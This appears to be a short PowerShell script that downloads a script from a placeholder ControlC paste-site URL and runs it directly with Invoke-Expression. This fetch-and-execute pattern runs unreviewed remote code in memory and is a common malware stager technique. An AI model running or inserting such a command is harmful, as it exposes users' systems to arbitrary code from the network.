#this script will run a script directly from ControlC
$url = "https://www.controlc.com/<HASH>"
$script = (Invoke-WebRequest -Uri $url).Content
Invoke-Expression $script